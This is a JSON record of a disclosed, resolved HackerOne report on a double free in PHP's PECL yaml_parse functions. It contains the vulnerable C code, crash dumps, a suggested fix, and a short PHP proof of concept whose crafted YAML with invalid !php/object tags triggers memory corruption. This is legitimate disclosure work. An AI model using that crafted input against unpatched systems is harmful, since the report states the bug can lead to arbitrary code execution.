{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73256, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-05-18T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "PHP yaml_parse/yaml_parse_file/yaml_parse_url Double Free", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:45:10.596Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:45:10.596Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "johnleitch", 
                "url": "/johnleitch"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496268, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "johnleitch", 
                "url": "/johnleitch"
            }, 
            "created_at": "2015-06-30T11:45:10.596Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:46.361Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196231, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "johnleitch", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/johnleitch", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-05-18T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73256", 
    "created_at": "2015-05-10T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"https://bugs.php.net/bug.php?id=69616\" href=\"/redirect?signature=d96fda9a9f6e4774a492d6c2ddacba05b11d7b78&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69616\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=69616</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>The yaml_* parsing functions suffers from an exploitable double free caused by the error path for the php_var_unserialize() call on line 797 of pecl/file_formats/yaml.git/parse.c:</p>\n<pre class=\"highlight plaintext\"><code>        if (IS_NOT_IMPLICIT_AND_TAG_IS(event, YAML_PHP_TAG)) {\n                const unsigned char *p;\n                php_unserialize_data_t var_hash;\n\n                p = (const unsigned char *) value;\n                PHP_VAR_UNSERIALIZE_INIT(var_hash);\n\n                if (!php_var_unserialize(\n                                &amp;retval, &amp;p, p + (int) length, &amp;var_hash TSRMLS_CC)) {\n                        PHP_VAR_UNSERIALIZE_DESTROY(var_hash); &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; First free\n                        php_error_docref(NULL TSRMLS_CC, E_NOTICE,\n                                        &quot;Failed to unserialize class&quot;);\n                        /* return the serialized string directly */\n                        ZVAL_STRINGL(retval, value, length, 1);\n                }\n\n                PHP_VAR_UNSERIALIZE_DESTROY(var_hash); &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Second free\n                return retval;\n        }\n</code></pre>\n<p>Should php_var_unserialize return false, var_hash is immediately freed via PHP_VAR_UNSERIALIZE_DESTROY, and then freed once more prior to the function returning. This code path can be forced by crafting a YAML document that contains an invalid !php/object value. An example is as follows:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php \n\n$yaml = &lt;&lt;&lt;YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?&gt;\n</code></pre>\n<p>And it produces the following crash:</p>\n<pre class=\"highlight plaintext\"><code>eax=00000000 ebx=55a0b760 ecx=02fc9e58 edx=000a0d08 esi=015c41f8 edi=02deedc8\neip=55a0b7dc esp=014ce1d0 ebp=00000000 iopl=0         nv up ei ng nz ac pe cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297\nphp5ts!_efree+0x7c:\n55a0b7dc 8b043a          mov     eax,dword ptr [edx+edi] ds:002b:02e8fad0=??????\n??\n0:000&gt; k\nChildEBP RetAddr\n014ce1d8 55b9d92c php5ts!_efree+0x7c\n014ce1ec 613b45bd php5ts!var_destroy+0x1c\n014ce25c 613b50fb php_yaml!eval_scalar+0x60d\n014ce2ac 613b4a38 php_yaml!handle_scalar+0x2b\n014ce2c8 613b4d09 php_yaml!get_next_element+0xb8\n014ce384 613b4a16 php_yaml!handle_mapping+0x159\n014ce3a0 613b4afe php_yaml!get_next_element+0x96\n014ce3c4 613b3f33 php_yaml!handle_document+0x5e\n014ce3e4 613b5f37 php_yaml!php_yaml_read_partial+0x93\n014ce560 559e8721 php_yaml!zif_yaml_parse+0x177\n014ce5c4 559e7de8 php5ts!zend_do_fcall_common_helper_SPEC+0x161\n014ce600 559d33ea php5ts!execute_ex+0x378\n014ce628 559d31ab php5ts!zend_execute+0x1ca\n014ce65c 559d3694 php5ts!zend_execute_scripts+0x14b\n014ce86c 770c9580 php5ts!php_execute_script+0x1b4\n014ce8c4 76b9a3fa ntdll!RtlInitializeCriticalSectionEx+0xc2\n014ce8dc 76b9a293 KERNELBASE!BasepInitializeFindFileHandle+0x51\n014cecac 76b9a293 KERNELBASE!FindFirstFileExW+0x347\n014cefb4 76bc39cc KERNELBASE!FindFirstFileExW+0x347\n014cf25c 770eb1b7 KERNELBASE!FindFirstFileA+0x6c\n014cf29c 770c8891 ntdll!LdrpApplyLookupReference+0x1e\n014cf354 770c8c78 ntdll!RtlWow64EnableFsRedirectionEx+0x51\n014cf4c4 770c9493 ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x2d8\n014cf528 770c8092 ntdll!LdrpApplyFileNameRedirection+0x96\n014cf5fc 770d4d3e ntdll!_SEH_epilog4_GS+0xa\n014cf640 00000000 ntdll!LdrpGetProcedureAddress+0x3d\n</code></pre>\n<p>Further, the document can be leveraged to manipulate the layout of memory, allowing for EIP control after the double free has occurred, and thus arbitrary code execution. An example that triggers a DEP access violation can be found here: <a title=\"http://autosectools.com/YamlDoubleFreeDepAV.txt\" href=\"/redirect?signature=308e4b0a85e812926d313f2095bb2eaa1c088fb6&amp;url=http%3A%2F%2Fautosectools.com%2FYamlDoubleFreeDepAV.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://autosectools.com/YamlDoubleFreeDepAV.txt</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>And it produces the following exploitable crash: </p>\n<pre class=\"highlight plaintext\"><code>0:000&gt; r\neax=b6072cb5 ebx=00000000 ecx=55fc7ce0 edx=01564358 esi=02e57450 edi=0155e4b8\neip=b6072cb5 esp=014ce3f0 ebp=014ce45c iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\nb6072cb5 ??              ???\n0:000&gt; k\nChildEBP RetAddr\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n014ce3ec 55a095a9 0xb6072cb5\n014ce40c 55d7bbd0 php5ts!_zval_copy_ctor_func+0x139\n00000000 00000000 php5ts!zend_std_read_property+0x3967e0\n</code></pre>\n<p>To fix this issue, it is recommended that the free be removed from the error path taken when php_var_unserialize() returns false.</p>\n\n<h2 id=\"test-script\">Test script:</h2>\n\n<p>ReadAV:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php \n\n$yaml = &lt;&lt;&lt;YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?&gt;\n</code></pre>\n<p>DEPAV:<br>\n<a title=\"http://autosectools.com/YamlDoubleFreeDepAV.txt\" href=\"/redirect?signature=308e4b0a85e812926d313f2095bb2eaa1c088fb6&amp;url=http%3A%2F%2Fautosectools.com%2FYamlDoubleFreeDepAV.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://autosectools.com/YamlDoubleFreeDepAV.txt</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "https://bugs.php.net/bug.php?id=69616\n\nDescription:\n------------\nThe yaml_* parsing functions suffers from an exploitable double free caused by the error path for the php_var_unserialize() call on line 797 of pecl/file_formats/yaml.git/parse.c:\n\n```\n        if (IS_NOT_IMPLICIT_AND_TAG_IS(event, YAML_PHP_TAG)) {\n                const unsigned char *p;\n                php_unserialize_data_t var_hash;\n\n                p = (const unsigned char *) value;\n                PHP_VAR_UNSERIALIZE_INIT(var_hash);\n\n                if (!php_var_unserialize(\n                                &retval, &p, p + (int) length, &var_hash TSRMLS_CC)) {\n                        PHP_VAR_UNSERIALIZE_DESTROY(var_hash); <<<<<<<< First free\n                        php_error_docref(NULL TSRMLS_CC, E_NOTICE,\n                                        \"Failed to unserialize class\");\n                        /* return the serialized string directly */\n                        ZVAL_STRINGL(retval, value, length, 1);\n                }\n\n                PHP_VAR_UNSERIALIZE_DESTROY(var_hash); <<<<<<<< Second free\n                return retval;\n        }\n```\n    \nShould php_var_unserialize return false, var_hash is immediately freed via PHP_VAR_UNSERIALIZE_DESTROY, and then freed once more prior to the function returning. This code path can be forced by crafting a YAML document that contains an invalid !php/object value. An example is as follows:\n\n```\n<?php \n\n$yaml = <<<YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?>\n```\n\nAnd it produces the following crash:\n\n```\neax=00000000 ebx=55a0b760 ecx=02fc9e58 edx=000a0d08 esi=015c41f8 edi=02deedc8\neip=55a0b7dc esp=014ce1d0 ebp=00000000 iopl=0         nv up ei ng nz ac pe cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297\nphp5ts!_efree+0x7c:\n55a0b7dc 8b043a          mov     eax,dword ptr [edx+edi] ds:002b:02e8fad0=??????\n??\n0:000> k\nChildEBP RetAddr\n014ce1d8 55b9d92c php5ts!_efree+0x7c\n014ce1ec 613b45bd php5ts!var_destroy+0x1c\n014ce25c 613b50fb php_yaml!eval_scalar+0x60d\n014ce2ac 613b4a38 php_yaml!handle_scalar+0x2b\n014ce2c8 613b4d09 php_yaml!get_next_element+0xb8\n014ce384 613b4a16 php_yaml!handle_mapping+0x159\n014ce3a0 613b4afe php_yaml!get_next_element+0x96\n014ce3c4 613b3f33 php_yaml!handle_document+0x5e\n014ce3e4 613b5f37 php_yaml!php_yaml_read_partial+0x93\n014ce560 559e8721 php_yaml!zif_yaml_parse+0x177\n014ce5c4 559e7de8 php5ts!zend_do_fcall_common_helper_SPEC+0x161\n014ce600 559d33ea php5ts!execute_ex+0x378\n014ce628 559d31ab php5ts!zend_execute+0x1ca\n014ce65c 559d3694 php5ts!zend_execute_scripts+0x14b\n014ce86c 770c9580 php5ts!php_execute_script+0x1b4\n014ce8c4 76b9a3fa ntdll!RtlInitializeCriticalSectionEx+0xc2\n014ce8dc 76b9a293 KERNELBASE!BasepInitializeFindFileHandle+0x51\n014cecac 76b9a293 KERNELBASE!FindFirstFileExW+0x347\n014cefb4 76bc39cc KERNELBASE!FindFirstFileExW+0x347\n014cf25c 770eb1b7 KERNELBASE!FindFirstFileA+0x6c\n014cf29c 770c8891 ntdll!LdrpApplyLookupReference+0x1e\n014cf354 770c8c78 ntdll!RtlWow64EnableFsRedirectionEx+0x51\n014cf4c4 770c9493 ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x2d8\n014cf528 770c8092 ntdll!LdrpApplyFileNameRedirection+0x96\n014cf5fc 770d4d3e ntdll!_SEH_epilog4_GS+0xa\n014cf640 00000000 ntdll!LdrpGetProcedureAddress+0x3d\n```\n\nFurther, the document can be leveraged to manipulate the layout of memory, allowing for EIP control after the double free has occurred, and thus arbitrary code execution. An example that triggers a DEP access violation can be found here: http://autosectools.com/YamlDoubleFreeDepAV.txt\n\nAnd it produces the following exploitable crash: \n\n```\n0:000> r\neax=b6072cb5 ebx=00000000 ecx=55fc7ce0 edx=01564358 esi=02e57450 edi=0155e4b8\neip=b6072cb5 esp=014ce3f0 ebp=014ce45c iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\nb6072cb5 ??              ???\n0:000> k\nChildEBP RetAddr\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n014ce3ec 55a095a9 0xb6072cb5\n014ce40c 55d7bbd0 php5ts!_zval_copy_ctor_func+0x139\n00000000 00000000 php5ts!zend_std_read_property+0x3967e0\n```\n\nTo fix this issue, it is recommended that the free be removed from the error path taken when php_var_unserialize() returns false.\n\nTest script:\n---------------\nReadAV:\n\n```\n<?php \n\n$yaml = <<<YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?>\n```\n\nDEPAV:\nhttp://autosectools.com/YamlDoubleFreeDepAV.txt\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}